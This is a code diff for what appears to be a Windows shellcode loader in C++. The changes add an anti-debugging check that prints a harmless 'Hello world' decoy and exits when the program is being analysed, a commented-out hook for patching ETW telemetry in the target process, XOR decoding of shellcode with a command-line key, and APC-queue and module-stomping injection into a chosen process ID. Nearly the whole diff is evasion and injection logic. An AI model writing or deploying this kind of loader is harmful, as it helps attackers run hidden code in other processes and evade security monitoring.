@@ -10,6 +10,7 @@
 #include "syscall_global.hpp"
 #include "injector.hpp"
 #include "apc.hpp"
+#include "patch.hpp"
 
 
 #include <psapi.h>
@@ -102,6 +103,8 @@ void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
 
     hProcess = mainInjector.process(pid);
 	std::cout << "Handle for pid " << pid << ": " << hProcess << "\n";
+	std::cout << "patching etw !!\n";
+	//patchRemoteETW(hProcess);
     rBuffer = mainInjector.vAlloc(hProcess, NULL, sizeof(moduleToInject));
     //rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
     mainInjector.wrMem(hProcess, rBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject));
@@ -164,22 +167,12 @@ void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
     
 
 }
-
-
-void print(std::string message, unsigned char* value, int flag) {
-    if (flag == 0) {
-        std::cout << "[+]" << message << value << std::endl;
-    }
-    if(flag == 1) {
-        std::cout << "[-]" << message << value << std::endl;
-	}
-    if(flag == 2) {
-        std::cout << "[!!]" << message << value << std::endl;
-	}
-	
-}
+//debug antiDebug;
 int main(int argc, char* argv[]) {
-    
+    if (antiDebug.checkDebug()) {
+        std::cout << "Hello world !!!";
+        return 0;
+    };
     
 
     helper::Options opt = helperHandler.parseArgs(argc, argv);
@@ -211,26 +204,34 @@ int main(int argc, char* argv[]) {
         std::cout << "Decoding shellcode with key : " << (int)opt.key << "\n";
     }
     
-    //else {
-        //unsigned char shellcode_key = 0x67;
+    else {
+        
 
 
-        //helperHandler.xor_shellcode(shellcode, shellcode_len, shellcode_key);
-    //}
+        helperHandler.xor_shellcode(shellcode, shellcode_len, opt.key);
+    }
 	std::cout << "pid: " << opt.pid << "\n";
     
 
 	process_id = opt.pid;
 
-    if (opt.method == "apc") {
+    if (opt.method == "apc" && opt.useRemote) {
         apcQueueInjection(process_id, shellcode_vector.size(), shellcode_vector.data());
     }
-    else if (opt.method == "stomp") {
+    else if (opt.method == "apc") {
+		apcQueueInjection(process_id, (SIZE_T)shellcode_len, shellcode);
+    }
+    else if (opt.method == "stomp" && opt.useRemote) {
         
 
         moduleStomping(process_id,
             shellcode_vector.data(),
             shellcode_vector.size());
+    }
+    else if(opt.method == "stomp"){
+        moduleStomping(process_id,
+            shellcode,
+            shellcode_len);
     }
 
     return 0;
